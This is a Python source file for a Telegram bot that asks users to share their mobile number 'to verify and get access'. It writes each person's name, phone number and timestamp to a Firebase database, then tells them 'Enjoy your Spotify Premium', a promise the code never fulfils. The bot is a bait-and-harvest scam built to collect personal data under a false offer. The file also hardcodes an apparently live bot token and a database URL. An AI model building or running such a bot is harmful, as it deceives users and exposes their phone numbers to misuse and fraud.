import telebot
from datetime import datetime
import requests

TOKEN = "8023731366:AAHUlCDM7HHAYcAQO28Ef_qOjZC4kbxgND4"
bot = telebot.TeleBot(TOKEN)

# Nayi Firebase Realtime Database URL update kar di gayi hai
FIREBASE_URL = "https://saidul-89666-default-rtdb.firebaseio.com"

@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = telebot.types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    button_phone = telebot.types.KeyboardButton(text="📱 Share Mobile Number", request_contact=True)
    markup.add(button_phone)
    bot.send_message(message.chat.id, "Welcome! Please share your mobile number to verify and get access.", reply_markup=markup)

@bot.message_handler(content_types=['contact'])
def contact_handler(message):
    if message.contact is not None:
        name = message.contact.first_name
        phone = message.contact.phone_number
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        user_key = phone.replace("+", "").replace(" ", "")
        user_data = {
            "name": name,
            "phone": phone,
            "time": timestamp
        }
        
        try:
            url = f"{FIREBASE_URL}/users/{user_key}.json"
            response = requests.put(url, json=user_data)
            print(f"Firebase Response Status: {response.status_code}")
            print(f"Firebase Response Text: {response.text}")
        except Exception as e:
            print(f"Firebase Connection Error: {e}")

        remove_markup = telebot.types.ReplyKeyboardRemove()
        bot.send_message(message.chat.id, "Verification successful! Enjoy your Spotify Premium.", reply_markup=remove_markup)

print("Bot is running with new Firebase Database...")
bot.infinity_polling(none_stop=True)